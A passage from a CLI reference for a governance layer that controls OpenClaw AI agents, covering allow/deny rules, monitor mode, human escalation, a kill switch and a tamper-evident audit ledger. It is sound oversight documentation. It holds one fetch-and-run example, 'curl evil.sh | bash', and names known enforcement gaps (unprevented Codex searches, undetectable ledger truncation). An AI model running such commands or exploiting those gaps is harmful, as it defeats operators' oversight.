| `enforce` | The gate is live: unlisted actions are blocked or escalated                                                                                                    |
| `monitor` | Decisions are recorded but **never** block. The ledger records the verdict that _would_ have applied, so a dry run predicts the effect of switching to enforce |
| `off`     | The gate abstains entirely and nothing is recorded                                                                                                             |

```bash
openclaw governance policy set-mode monitor
```

**Exit code:** `0` on success; a thrown validation error (non-zero) for an
unrecognised mode.

### `governance policy set-ask <mode>`

Controls what happens when a governed action matches no rule.

| Mode      | Behaviour                                                                                                                               |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| `on-miss` | Pause and request human approval, routed into OpenClaw's existing approval flow. An `allow-always` answer is written back as a new rule |
| `off`     | Deny outright — strict default-deny                                                                                                     |

```bash
openclaw governance policy set-ask off
```

### `governance policy add-rule`

Adds a rule that allows or forbids something.

```
openclaw governance policy add-rule
  --kind <command|path|network>   (required)
  --pattern <regex>               (required)
  [--effect <allow|deny>]
  [--access <read|write>]
  [--description <text>]
  [--ttl-minutes <n>]
  [--agent <agentId>]
```

| Option          | Meaning                                                                                                          |
| --------------- | ---------------------------------------------------------------------------------------------------------------- |
| `--kind`        | Which resource family the rule matches                                                                           |
| `--pattern`     | A JavaScript regular expression tested against the extracted resource                                            |
| `--effect`      | `allow` (default) or `deny`. A deny rule is evaluated **before** every allowance and cannot be overridden by one |
| `--access`      | **Path rules only**: `read` or `write`. Omit to cover both directions                                            |
| `--description` | Free text shown in the dashboard                                                                                 |
| `--ttl-minutes` | Expire the rule after N minutes. **Omit for an indefinite rule that never expires**                              |
| `--agent`       | Scope the rule to one agent. Omit for a global rule binding every agent                                          |

What each `--kind` is matched against:

| Kind      | Governed tools                                                              | Matched string                                                  |
| --------- | --------------------------------------------------------------------------- | --------------------------------------------------------------- |
| `command` | `exec`, `bash`, `terminal` (its `command` and `data`)                       | the full command line                                           |
| `path`    | `read`, `grep`, `find`, `ls` (read); `write`, `edit`, `apply_patch` (write) | each target path, canonicalised — see `PERMISSION-SPEC.md` §3.1 |
| `network` | `web_fetch`                                                                 | the canonicalised hostname; the raw URL if none can be parsed   |

#### `--effect deny`

Worth understanding rather than skipping, because "don't write an allow rule"
looks equivalent and is not. A denial is checked before every allowance and no
allowance can override it, so it survives whatever anybody grants later. An
absence of allowances is undone by the next broad grant, and whoever wanted the
restriction is not there to notice.

```bash
# This agent must never touch billing, whatever else is permitted later
openclaw governance policy add-rule --kind path --pattern "^billing/.*$" --effect deny
```

The warnings you get flip with the direction. A catch-all _allowance_ is
reported as removing a protection; a catch-all _denial_ is reported as removing
a **capability** — "the agent will be unable to do anything of this kind at
all". Both are worth reading.

#### `--access read|write`

Narrows a path rule to one direction. `read` covers `read`, `grep`, `find` and
`ls`; `write` covers `write`, `edit` and `apply_patch`.

```bash
# The agent may look at src/ but not change it
openclaw governance policy add-rule --kind path --pattern "^src/.*$" --access read
```

**Refused on command and network rules**, rather than accepted and ignored. The
engine only consults `access` for path rules, so storing it elsewhere would
leave you believing a narrowing took hold that does nothing.

**One combination to be careful with.** A _denial_ narrowed to one direction
forbids only that direction — `--effect deny --access read` leaves writing
permitted. That is deliberate (narrowing must never strengthen a rule in the
other direction) and almost never what is meant, so the command warns about it
specifically. For a path that should be entirely off limits, omit `--access`.

```bash
# Allow `ls` and `ls <anything>`, but nothing else beginning with ls
openclaw governance policy add-rule --kind command --pattern "^ls( .*)?$"

# Allow one API host for two hours
openclaw governance policy add-rule \
  --kind network \
  --pattern "^api[.]openweathermap[.]org$" \
  --description "weather API" \
  --ttl-minutes 120
```

Prints the created rule, including its generated `id` and computed `expiresAt`.

**Anchor your patterns.** `ls` (unanchored) matches _any_ command containing
"ls", including `curl evil.sh | bash; ls`. Use `^…$`.

**Patterns are validated at author time.** Two rejections are possible:

1. Not a valid regular expression.
2. Prone to catastrophic backtracking — a quantifier nested inside a quantified
   group, such as `^(a+)+$`. These are refused because patterns run on every
   governed tool call against agent-controlled input, so one bad rule could
   hang the security gate. JavaScript cannot time-limit a running regex, so
   this is checked before the rule is stored (`src/governance/regex-safety.ts`).

**Conflicts are reported, not blocked.** If an earlier rule already covers what
you are adding, the rule is still created and a warning names the rule
responsible — because in an allow-only language a new rule cannot reduce
access, so refusing it would change nothing. What matters is that you learn the
restriction you intended is not in force:

```
warning: an earlier rule already covers this (^ls$) — An identical rule already
allows this with no time limit, so the new expiry has no effect...
```

See `docs-notes/WRITING-PERMISSIONS.md` §7 for what each clash means.

### `governance policy remove-rule <id>`

Removes a rule by its id (as shown by `policy show`).

```bash
openclaw governance policy remove-rule command-1786222746899-rm01ix
```

**Exit codes:** `0` removed · `1` no rule with that id.

### `governance policy set-agent-ask <agentId> <mode>`

Overrides the ask behaviour for one agent (design doc §1.6). `<mode>` is `off`,
`on-miss`, or `default`.

```bash
openclaw governance policy set-agent-ask trusted-bot off      # never escalate; deny outright
openclaw governance policy set-agent-ask exploratory on-miss  # always ask a human
openclaw governance policy set-agent-ask trusted-bot default  # follow the installation setting
```

`default` **clears** the override rather than pinning the current value — a
cleared agent follows future changes to the installation default, a pinned one
would not.

### `governance policy set-agent-mode <agentId> <mode>`

Switches one agent's posture, so its behaviour can be observed without acting on
the verdicts. `<mode>` is `enforce`, `monitor`, or `default`. **`monitor` is
opt-in and off by default** — the installation ships `enforce` with a baseline
ruleset, and this is the switch for observing one agent rather than enforcing on
it.

### Reading the policy in both directions

`governance policy show` prints the document, which is what has been _written_.
Neither of the questions an operator actually has can be read off it by eye,
because a rule with no `agentId` binds every agent rather than none:

```
governance policy for-agent build-bot     # what is in force for this agent
governance policy rule-agents rule-a1b2   # which agents does this rule bind
```

`for-agent` prints the effective posture (marking whether it is the
installation default or an override), whether the kill switch is engaged, and
every rule in force — each tagged `global` or `agent` so it is clear whether
removing it would affect one workload or all of them.

`rule-agents` leads with the fact that a rule is global _before_ listing the
agents it currently binds, because a global rule also binds every agent created
tomorrow, and a list read first invites the wrong conclusion.

```bash
openclaw governance policy set-agent-mode exploratory monitor  # watch, do not block
openclaw governance policy set-agent-mode exploratory enforce  # pin this agent to enforce
openclaw governance policy set-agent-mode exploratory default  # follow the installation posture
```

This is how monitor mode is meant to be used: point it at one agent, let it run
its real work, read the `deny` and `ask` entries out of the ledger, and promote
the ones that turn out to be legitimate into rules. The rest of the installation
keeps enforcing throughout.

**`off` is refused here, deliberately, and there is no flag to force it.** A
per-agent `off` is not a weaker posture — it is the absence of the gate. The
engine returns before the lockdown check, so that agent stops being covered by
the kill switch and by the core denials as well as by ordinary rules, and no
ledger entry records that it happened. Since a User may set this for an agent
assigned to them, accepting `off` would make "switch off every protection on my
own agent" one command. To switch the gate off, use
`governance policy set-mode off`, which is installation-wide, Administrator-level
and audited as one visible act.

Same control on the dashboard: **Settings → Governance → Observe one agent**.

**Exit codes:** `0` set or cleared · `1` invalid posture.

### `governance policy grant-folder <folder>`

Allows a folder and forbids named paths inside it, in one command.

```
$ openclaw governance policy grant-folder src --except src/secrets --agent support
allow  rule-1756...  ^src(/|$)
deny   rule-1756...  ^src/secrets(/|$)

1 exception written as separate deny rules; a deny rule beats every allowance.
  Remove any of them with "governance policy remove-rule <id>".
```

**It is a shortcut, not a new mechanism.** The engine has always done this — a
`path` rule is a pattern, and denials are evaluated before allowances across
every tier. What this adds is saying it in one act instead of writing two regular
expressions and knowing which wins. `policy add-rule` is untouched and remains
the way to write anything this does not express.

**Everything it writes is an ordinary rule**, which is why the ids are printed
rather than a bare "done". Each has its own row in `policy show`, and each can be
removed on its own: remove the exception and the folder stays granted; remove the
grant and the exception stays denied.

**Authorization is the same as `add-rule`'s**, asked through the same permission
functions so the two cannot answer it differently: a User may grant for an agent
assigned to them; a grant binding **every** agent (omit `--agent`) is the
Administrator tier.

**Three things it refuses**, each with the reason named:

- An **exception outside the folder** — writing it would put a denial somewhere
  the operator was not looking. The message names both paths and says to add it
  as its own deny rule if that was the intention.
- **More than 50 exceptions** in one grant.
- A **path too long to express as a rule**, checked against the same limit the
  dashboard applies, so the two surfaces cannot accept different things.

**`--access` narrows the grant only, never the exceptions.** A read-narrowed
grant plus a read-narrowed exception would leave the excepted path _writable_,
which is the opposite of what "except this" means.

**Exit codes:** `0` the rules were written · `1` the input was refused, with the
reason on stdout.

### `governance policy set-hitl-timeout <seconds>`

How long an escalation waits for a human before timing out. Accepts 5–86400.

```bash
openclaw governance policy set-hitl-timeout 600
```

On timeout the action is **denied** — never allowed — and the question is
pushed onto the pending-decision stack. Timing out into "allow" would let an
unattended installation decay into no governance at all.

---

## 3b. Talking to an agent

### `governance agent prompt <agentId> <message...>`

Sends a prompt to an agent and prints the reply. The message is taken as the
rest of the line, so it does not need quoting.

```bash
openclaw governance agent prompt research-bot summarise the readme
openclaw governance agent prompt --stream research-bot review the diff
openclaw governance agent transcript research-bot
```

The run is OpenClaw's ordinary agent run, so **every tool call it makes is still
checked against your policy** — prompting gives the agent nothing new, only a way
for you to ask. A locked-down agent refuses the prompt outright; release it
first.

**`--stream`** prints the reply as the agent produces it instead of all at once
when it finishes. Off by default on purpose: a terminal is often reading into a
pipe or a file, where a reply printed progressively stops being the reply. Turn
it on when you are watching a long task by hand.

**Stopping a run.** Press Ctrl-C. That cancels the agent run itself, not just
the printout, and the cancellation is recorded.

There is deliberately **no `governance agent cancel` command.** The table of
in-flight prompts lives inside the process running them, and this command runs
the agent in its own — so such a command could only ever stop a run started in
the same terminal, and one that looked like it could reach the Gateway's runs
would be reporting a power it does not have. Use the dashboard to stop a prompt
somebody else started, or one whose terminal is gone.

**Limits that apply here too.** A prompt is stopped after five minutes, and each
account may have two running at once (six across the installation). The CLI
counts as the account `cli`, so several terminals share one allowance.

**Attribution.** ~~The CLI has no login, so a prompt sent from a terminal is
recorded against `cli` rather than a person (limitation A6).~~ **Corrected
2026-08-30: the CLI has had a login since T5 (2026-08-24).** Run
`openclaw governance login`; commands then resolve the signed-in account through
`verifySession` and record it in the ledger by name and tier, exactly as the
dashboard does. A6 is closed. `cli` survives only where no account can sign in:
the repair command for accounts predating groups, and the first-account
bootstrap.

**Exit codes:** `0` the run completed · `1` the run failed or was refused.

### `governance backend status` and `governance backend set-codex <on|off>`

**Root only, on both.** The machine-level half of the two-layer Codex control:
whether this installation offers the backend at all. Its per-agent counterpart is
`governance agents set-codex`, above.

```
$ openclaw governance backend status
codex: disabled (nobody has decided; the safe default stands)

$ openclaw governance backend set-codex on
The Codex backend is now offered on this installation.
  A recursive search reaching a denied path is recorded there but NOT prevented:
  its results cannot be withheld from the model, because the Codex hook protocol
  has no field for substituting a tool result.
  No agent can use it until an Administrator permits that agent as well
  ("governance agents set-codex <agentId> on").
  This decision has been recorded in the ledger against your account.
```

**Why Root rather than Administrator**, which was the first answer and the wrong
one: this writes `plugins.entries.codex.enabled` into **OpenClaw's own
configuration** and refreshes the plugin registry, rather than changing
governance's state in `policy.json` the way the posture does. Its blast radius
reaches outside governance entirely — withdrawing the backend also withdraws the
Codex-managed model catalogue, media understanding and prompt overlays, and
leaves supervised chats locked until a restart. §1.6 gives Root the deployment
configuration and the Administrator the agents' security boundaries; a plugin's
enablement is the first. §3.5.62.

**`status` distinguishes the default from a decision.** "Nobody has decided, so
the safe answer stands" is a different fact from "an operator turned it off", and
an operator auditing an installation needs to tell them apart. Absent an explicit
entry the backend reports **disabled**, which is a governance stance rather than
a reading of upstream's default: the layer declines to treat a backend it cannot
fully enforce as available until somebody says so.

`status` is Root-gated to match the `GET backend/codex` route rather than to
protect the value, which is not a secret. ~~The asymmetry recorded against
`governance deployment` below — any signed-in tier may read what the dashboard
shows only to Root — is real, and these commands decline to add a second
instance of it.~~ **That asymmetry was closed on 2026-09-01 (finding 175):
`governance deployment` is Root now, as its route always was.** These commands
were right to decline to copy it, and the paragraph is kept because "we noticed
the inconsistency and matched the stricter side" is the decision worth recording
— what nobody did was go back and fix the side that was wrong.

**Two ledger entries, not one (finding 217, 2026-09-02).** The change is recorded
**before** it is attempted — the rule `registerAgent` established, so a change
that dies half-way still shows who asked — and again **after** the configuration
actually holds it:

| Action                             | When                     | What it says                                  |
| ---------------------------------- | ------------------------ | --------------------------------------------- |
| `governance.backend.codex-request` | before the write         | `codex backend disabled -> enabled requested` |
| `governance.backend.codex`         | after the write succeeds | `codex backend disabled -> enabled`           |

Until 2026-09-02 there was **one** entry, written before the attempt and phrased
as the accomplished change. `replaceConfigFile` takes a base hash and throws when
the configuration moved underneath it, so a failed toggle left the tamper-evident
trail asserting that this installation had begun accepting the Codex enforcement
gap — the exact question the entry exists to answer, answered wrongly in the
permissive direction. The pair matches
`governance.organisation.delete-request` / `governance.organisation.delete` and
`agentProvision` / `registerAgent`, which had it right already.

**Exit codes:** `0` the change was made or the state was printed · `1` the value
was not `on` or `off`. A refusal on tier prints the reason and exits `0`, like
every other gated command here.

### `governance policy set-user-ask <username> <mode>`

**Root only.** The per-**account** half of the escalation axis, and the tier is
the point: §1.6 gives an Administrator escalation per _agent_
(`policy set-agent-ask`) and gives Root escalation per _person_. This command is
gated by `canManageAccounts`, not `canManageGlobalPolicy`, so the two axes
cannot collapse into one another.

```bash
openclaw governance policy set-user-ask malek off        # never escalate for this account
openclaw governance policy set-user-ask malek on-miss    # escalate on an unmatched call
openclaw governance policy set-user-ask malek default    # clear the override
```

**The account name is folded**, so an override set for `Malek` is the one
`resolveAskMode` reads for `malek`. That is not a courtesy: keying this map by
the spelling somebody typed while the engine looked it up canonically is a defect
this project has already had, where the control reported success, the dashboard
displayed the setting, and the engine never saw it.

**Added 2026-09-02 (finding 222)**, having been on the route and the dashboard
since the axis was built. §2d, which exists to name every dashboard-only
capability, did not list it — so nothing reported the gap, and the 2026-08-11
changelog entry below claiming "no known CLI gaps remain against the dashboard"
had been false ever since.

**Exit codes:** `0` the override was set or cleared · `1` the mode was not
`off`, `on-miss` or `default`. A refusal on tier prints the reason and exits `0`,
like every other gated command here.

### `governance agent runs` and `governance agent cancel <runId>`

Prompt runs in flight, and stopping one of them.

```
$ openclaw governance agent runs
  run-1756...  support-triage  by malek  42s

$ openclaw governance agent cancel run-1756...
cancelled run-1756...
```

**`cancel` is deliberately narrower than the kill switch.**
`governance kill` stops an agent and keeps it stopped until released;
this ends one run and leaves the agent working. During an incident an operator
wants both, and until 2026-08-31 this surface had only the blunt one — which
pushes people toward it.

**Scoped twice, as the route is.** Whether you see runs other accounts started is
the Administrator tier; which agents you may see at all is the ordinary agent
scope. Cancelling somebody else's run is likewise an operator act.

A run id that does not exist is reported as such rather than answered with
success.

### `governance agent transcript <agentId>`

Prints the conversation **your account** has had with an agent, oldest turn
first. Accepts `--limit <n>` (default 50).

Conversations are kept per (agent, account), so this shows **the same thread the
dashboard shows you** — signing in on either surface reaches one conversation.
What it does not show is somebody else's: two operators sharing an agent cannot
read each other's prompts.

> **This paragraph said the opposite until 2026-09-02 (finding 219.)** It read
> "this shows the `cli` thread — not what a User has said to the same agent from
> the dashboard", which was true before **T5** and false after it: T5 moved
> conversations from being owned by the machine (`cli`) to being owned by the
> signed-in account, precisely so two operators on one host would stop sharing a
> transcript. The code comment in `agent prompt` records the change; this
> document and the command's own `--help` line did not.

**Requires the same four checks the dashboard route makes** (finding 216): the
User tier or above, an organisation, the agent assigned to you unless you are an
Administrator, and the agent registered in your own organisation. Until
2026-09-02 this command asked only whether you were signed in.

Same capability on the dashboard: **Settings → Governance → Your agents**.

---

## 3c. Deployment oversight

### `governance deployment`

Reads the live deployment and reports whether it matches the architecture the
design specifies. Read-only — it changes nothing.

```bash
openclaw governance deployment
openclaw governance deployment --json
openclaw governance deployment --strict
```

| Option     | Effect                                                     |
| ---------- | ---------------------------------------------------------- |
| `--json`   | Print the whole report as JSON, for a provisioning script  |
| `--strict` | Exit 1 when any check has failed. Default is always exit 0 |

**Root only, since 2026-09-01 (finding 175).** The report gives the bind mode,
port, gateway auth mode and governance directory — a map of how to reach and
attack the installation, which is why `GET deployment` is the one read route
above Viewer. This command asked no tier question at all until that date, so any
signed-in account could read it.

**Why this exists on the command line and not only on the dashboard.** The
design has the dashboard reachable only through an SSH local port forward. So
the moment you most need to know whether the listener is exposed is over a plain
SSH session _before_ any tunnel exists — exactly when the dashboard is, by
design, unreachable. This is the surface that works then, and it is the one to
run first on a new VPS.

**That argument is about the surface, and it was quietly read as covering the
tier too.** It does not: needing the report over SSH before a tunnel exists says
nothing about which accounts may read it. Finding 175 is the cost of the gap
between what an argument establishes and what it gets used for.

**Why `--strict` is opt-in.** On a developer machine the platform check warns
(it is not Linux) and the permission checks report that POSIX mode bits are not
meaningful. A command that exits non-zero on every workstation is a command
people learn to ignore, so the default is exit 0 and `--strict` is for the
provisioning script that genuinely wants to fail the build.

Sample output:

```
platform      linux · 8.4 GB total
gateway       loopback:18789 · auth token
governance    ~/.openclaw/governance

[pass] deployment.bind_loopback
         The Gateway binds to loopback, so it is not reachable from another host directly.
[pass] deployment.tunnel_required
         No route to the dashboard exists from another host except a local port forward.
[warn] deployment.ledger_key_source
         The ledger key is stored on the same host as the ledger it protects, so an
         attacker with full filesystem access can still forge the chain.
         -> Supply the key through OPENCLAW_GOVERNANCE_LEDGER_KEY from a secret store.

0 failed · 1 warnings · 0 not determined here · 10 passed
```

**Four statuses, and `unknown` is not a synonym for `pass`.** A check that could
not run here — POSIX permissions on Windows, free space where `statfs` is
unavailable — reports `unknown` rather than quietly going green. A verification
report that shows a clean result because the detector was disconnected is worse
than no report, because somebody will act on it. `unknown` is counted and
displayed separately, and it is excluded from the overall verdict so that
"three things could not be checked here" cannot turn a sound deployment amber
either.

The same report is available to **Root** on the dashboard, where the tier is
enforced server-side. ~~The CLI has no login and reports with full visibility,
because its boundary is filesystem access rather than RBAC.~~ **Corrected
2026-08-30.** Since T5 the command requires a signed-in account
(`requireCliActor`), so it is not reachable without a login. What remains true is
that **any** signed-in tier may read it, because the command's predicate is
`() => true`, whereas the dashboard restricts the same report to Root. That
asymmetry is real and is now stated as itself rather than blamed on an absent
login — see §1 above.

---

## 4. Session and pending-decision commands

### `governance sessions`

Lists agent sessions currently running.

```bash
openclaw governance sessions
```

Only meaningful **inside the Gateway process**, which owns the run registry.
From the CLI you will normally see:

```
live session view unavailable: the Gateway owns the run registry, so this only
works from inside it
```

Use the dashboard (**Settings → Governance → Active agent sessions**) for the
live view.

### `governance pending list`

Shows escalations that timed out before anyone answered, newest first.

```bash
openclaw governance pending list
```

**User and above**, and **scoped to the agents you can see** — an escalation for
an agent you do not hold is not listed. Prints "No escalations are waiting for a
decision." rather than an empty array, because an empty list and a failed read
look identical.

### `governance pending decide <id> --allow|--deny`

Records a late judgement on a timed-out escalation.

```bash
openclaw governance pending decide pend-1786402739895-4p17nn --allow
```

**User and above, and you must manage the agent the escalation concerns** —
authorised against the **stored** entry, never against an agent named on the
command line.

**This does not resurrect the blocked action** — that turn finished long ago.
It records your judgement, and an `--allow` is your cue to add a rule so the
next attempt succeeds. The command says so explicitly rather than implying the
agent resumed.

**Exit codes:** `0` recorded · `1` no such pending decision, or you do not
manage its agent.

> **Both commands changed on 2026-09-01 (findings 172 and 173).** They were the
> last two gated on "any signed-in account", while their routes asked a User
> floor and, for the write, `canManageAgent` against the stored entry. A Viewer
> could record decisions, a User could record them for agents they never held,
> and the list printed the whole organisation's stack — agent ids, tool names,
> and the resources they were blocked on.
>
> `decide` also recorded the literal actor `cli` **as a named actor**, which
> T35's guard rejects — and because the decision is written under a file lock
> before the ledger entry is appended, the command changed the state and then
> threw. **A decided escalation with no audit record at all**, and the throw was
> swallowed, so it reported nothing.

---

## 4b. Rule-request commands (T40)

The User tier's escalation path, on the command line since 2026-09-01. One
queue, read by Viewers, added to by Users, decided by Administrators — the same
three floors the dashboard and the HTTP routes use.

### `governance requests list [--pending]`

Shows the queue, **scoped to the agents you can see**. A request with no agent is
installation-wide and visible to anyone who can read the queue at all.

```bash
openclaw governance requests list --pending
```

```
req-1788209261-4kd8x1  [pending]  malek → agent build-agent
    requested command ^docker ps$: I need to see which containers the build left running
```

An approved row also prints `granted as rule <id>`, which is the link the
command set exists for.

**Viewer and above.** Says "No requests are waiting for a decision." in words
when there are none.

### `governance requests submit --kind <k> --pattern <re> --reason <why> [--agent <id>]`

Asks an Administrator to allow something you are currently denied.

```bash
openclaw governance requests submit --kind command --pattern '^docker ps$'   --reason 'I need to see which containers the build left running' --agent build-agent
```

**User and above**, and `canManageAgent` for an agent-scoped request —
`canManageAgent` rather than `canAuthorPolicyForAgent`, because requesting is not
authoring: a User whose Root has withheld authoring may still ask, and asking is
precisely the fallback withholding leaves them. Omitting `--agent` asks for a
rule binding every agent.

The pattern goes through the **same validator** the dashboard and
`policy add-rule` use, so a request that could never become a rule is refused
here rather than discovered by the Administrator at approval. The reason is
clamped to 500 characters, as the route clamps it.

**Exit codes:** `0` submitted · `1` refused, invalid, or you already hold the
maximum of 20 pending requests.

### `governance requests decide <id> --approve|--reject`

**Administrator and above.** Approving writes the rule — or applies the setting,
for the `agent-setting` arm — and joins it to the request.

```bash
openclaw governance requests decide req-1788209261-4kd8x1 --approve
```

```
approved req-1788209261-4kd8x1, granted as rule command-1788209812345-9x2mqr
```

**The rule is built from the stored request, never from anything typed here**, so
an Administrator grants what was reviewed. The decision is claimed **before** the
rule is created — the reverse order let two Administrators both pass the pending
check and both create a rule — and the request is reopened if the rule cannot be
written, because "approved, and the requester still cannot act, and nobody sees
it in the queue" is the one state that is never true.

**Exit codes:** `0` decided · `1` no pending request with that id, it was
decided by someone else first, or the ruleset is full.

---

## 5. Audit commands

### `governance audit tail`

Prints the most recent ledger entries as JSON.

```
openclaw governance audit tail [--limit <n>]   # default 50
```

```bash
openclaw governance audit tail --limit 20
```

The ledger holds two kinds of entry in one chain. **Agent activity** carries no
`entryKind`. A **policy or account change** carries `"entryKind": "admin"` and an
`"actor"` naming who made it. To read only the administrative trail:

```bash
openclaw governance audit tail --limit 200 | jq '.[] | select(.entryKind == "admin")'
```

To ask who last touched the rules:

```bash
openclaw governance audit tail --limit 200 | jq -r '.[] | select(.entryKind == "admin") | "\(.timestamp) \(.actor) \(.toolName) \(.resource)"'
```

The same split is available in the dashboard as the **Policy changes** filter on
the audit section, which needs no `jq`.

Each entry:

| Field                                  | Meaning                                                                                           |
| -------------------------------------- | ------------------------------------------------------------------------------------------------- |
| `seq`                                  | Strictly increasing. A gap is tampering evidence                                                  |
| `timestamp`                            | ISO 8601, when the decision was made                                                              |
| `agentId`, `sessionKey`                | Which agent and session acted                                                                     |
| `toolName`, `resourceKind`, `resource` | What was attempted (secrets already redacted)                                                     |
| `ruleId`                               | Which rule decided, or `default-deny` / `kill-switch`                                             |
| `decision`                             | `allow`, `deny`, or `ask`                                                                         |
| `intent`                               | **What the model said it was doing** on the turn that produced the call. Often absent — see below |
| `prevHash`, `hash`                     | The chain link and this entry's own SHA-256                                                       |

**`intent` is the field to read when you want to know _why_** (§1.6's "raw LLM
intent", added 2026-08-27). Everything else in the entry says what happened; this
one says what the agent claimed it was up to, in its own words — so the trail can
be read as _"it said it was checking the config, and then it opened something
else"_. Nothing else in the entry supports that comparison.

**It is absent more often than not, and that is normal**, never an error:

- a turn where the model narrated nothing;
- a harness that reports no assistant text;
- a restart between the model speaking and the tool running;
- any call not made by a model at all — this command line, a test, an
  administrative action.

Nothing is gated on it. It is redacted and clamped to 500 characters like any
other recorded text, and a **Viewer** sees it masked, because narration names the
files it is about to touch and quotes what it has already read.

To read what the agent said alongside what it did:

```bash
openclaw governance audit tail --limit 100 | jq -r '.[] | select(.intent) | "\(.decision) \(.resource) \(.intent)"'
```

_Internally:_ reads the JSONL file and returns the last N well-formed entries.
Malformed lines are skipped here (they are reported by `verify`, whose job it
is to notice them).

### `governance audit verify`

Recomputes the hash chain from the beginning and reports the first entry that
does not match.

```bash
openclaw governance audit verify
```

Clean:

```json
{ "ok": true, "entriesChecked": 8 }
```

Tampered:

```json
{
  "ok": false,
  "entriesChecked": 3,
  "brokenAtSeq": 3,
  "reason": "entry hash does not match its own recomputed content hash"
}
```

Possible `reason` values:

| Reason                                                      | What it means                                                  |
| ----------------------------------------------------------- | -------------------------------------------------------------- |
| `entry hash does not match its own recomputed content hash` | The entry's content was edited                                 |
| `prevHash does not match the preceding entry's hash`        | The chain was broken — typically an entry removed or reordered |
| `unexpected sequence number (expected N)`                   | A gap: an entry was deleted                                    |
| `line N: entry is not valid JSON` / `is missing seq/hash`   | Corruption or injected content                                 |

**Exit codes:** `0` chain intact · `1` verification failed. Suitable for a cron
job or monitoring check.

**Known limitation:** chaining detects any edit or deletion _within_ the log,
but not truncation of the newest entries, because a prefix of a valid chain is
itself a valid chain. Detecting that needs an external anchor (a counter-signed
checkpoint, or an off-host copy of the latest hash).

---

## 6. Kill switch

### `governance kill <agentId>`

Engages the emergency stop for one agent (design requirement #7).

```
openclaw governance kill <agentId> [--release]
```

```bash
openclaw governance kill main
```

```
governance lockdown engaged for agent "main" in 12.4ms
no in-flight termination available from the CLI (the Gateway owns the run registry)
```

**Who may run it: User and above, over an agent you manage, in your own
organisation** — the tier settled by `T42` on 2026-09-01, and now the same on all
three surfaces. All three are checked, and **none of them was, until 2026-09-01
(finding 174)** — while the `POST kill` route had checked all three for a week.
The third is the one that matters most: the lockdown's termination half reaches
the Gateway's **installation-wide** run registry and matches on agent id alone,
so before this fix an operator of one organisation could stop another
organisation's agents by naming one. That is finding 144, which was found,
fixed on the route, and written up — and then left open here. `--release` takes
the same gate, because an account that may not stop an agent must not be able to
restart one somebody else stopped.

**An unregistered agent id is refused.** Registration has been mandatory at the
gate since M5, so an agent that can run has a record; an id with no record
belongs to no organisation.

Two things happen, in this order:

1. **Lockdown** — the agent id is written to `policy.json`. The policy engine
   then denies every subsequent governed action from that agent, checked
   _before_ any allow rule, so an allowlisted command is refused too.
2. **Termination** — in-flight runs are signalled to abort. This works when the
   **Gateway** performs it, because the Gateway owns the live run registry and
   registers the abort implementation at startup
   (`src/gateway/governance-agent-termination.ts`). From the CLI — a separate
   process with no registry — the message above is printed instead of implying
   something was stopped.

Ordering is deliberate: locking first closes the window in which the agent
could legally start a fresh action between the abort and the lock landing.

The elapsed time printed is the measured wall-clock duration of the whole
operation, which is the evidence for requirement #7's one-second bound.

**The agent id is not case-sensitive, and until 2026-09-01 it silently was
(finding 202).** The id is folded to lower case before anything acts on it, so
`Scout` and `scout` stop the same agent. Before that fold, stopping `Scout` for
an agent called `scout` wrote a lockdown the gate did not recognise, matched no
runs to abort, and — because zero aborted runs reads as "nothing was in flight" —
printed a clean success. The agent kept running and kept being allowed. If you
are looking at a `policy.json` written before this build, a lockdown recorded in
the wrong case is folded automatically the next time it is loaded.

**A warning line may follow the success line.** If the stop landed but its ledger
entry could not be written — an unwritable disk, or the ledger's file lock timing
out under the burst of entries an incident produces — the command prints
`WARNING: the agent is stopped, but this stop could not be written to the audit
ledger`. That is deliberate: before finding 195 the same condition made the whole
command fail, so an emergency stop that had _worked_ was reported as having
failed, at the moment an operator would reach for something more drastic.

To stop an in-flight run, use the dashboard (**Settings → Governance →
Emergency kill switch**), which runs inside the Gateway.

### `governance kill <agentId> --release`

Releases the lockdown. Does **not** restart anything that was aborted.

```bash
openclaw governance kill main --release
```

Both actions are written to the audit ledger with actor `cli`.

---

## 7. Worked example — a full session

```bash
# 1. See where things stand
openclaw governance policy show

# 2. Strict default-deny while we tighten the rules
openclaw governance policy set-mode enforce
openclaw governance policy set-ask off

# 3. Allow exactly what the agent legitimately needs
openclaw governance policy add-rule --kind command --pattern "^ls( .*)?$"
openclaw governance policy add-rule --kind path    --pattern "^workspace/.*$"
openclaw governance policy add-rule --kind network --pattern "^api[.]example[.]com$"

# 4. Watch what the agent actually attempts
openclaw governance audit tail --limit 30

# 5. Prove the record has not been altered
openclaw governance audit verify

# 6. Something looks wrong — stop the agent
openclaw governance kill main

# 7. After investigating, resume
openclaw governance kill main --release
```

A safer rollout is to run `set-mode monitor` first: decisions are recorded with
the verdict that _would_ have applied, so `audit tail` shows exactly what
enforcing would have blocked before anything is actually blocked.

---

## 8. Exit codes

| Code              | Meaning                                                                                                        |
| ----------------- | -------------------------------------------------------------------------------------------------------------- |
| `0`               | Success                                                                                                        |
| `1`               | The operation completed but the answer was negative: rule id not found, or the audit chain failed verification |
| non-zero (thrown) | Invalid argument, e.g. an unrecognised mode or resource kind                                                   |

---

## 9. Scripts

| Script                               | Purpose                                                                                                                                                                  |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `start-governance.ps1`               | Starts the fork's Gateway on port 18799 and opens the dashboard (Windows)                                                                                                |
| `scripts/governance-linux-check.mjs` | Linux platform verification (requirement #9) — file locking, POSIX permissions, path handling, hashing, authorization rules. Runs on plain `node`, no dependency install |
| `scripts/ts-extension-resolver.mjs`  | ESM resolver mapping `./x.js` specifiers to `./x.ts`, so the Linux check runs against the real source without a build                                                    |

```bash
# Linux verification
node --import ./scripts/register-ts-resolver.mjs scripts/governance-linux-check.mjs
```

---

## 10. Change log for this reference

| Date       | Change                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
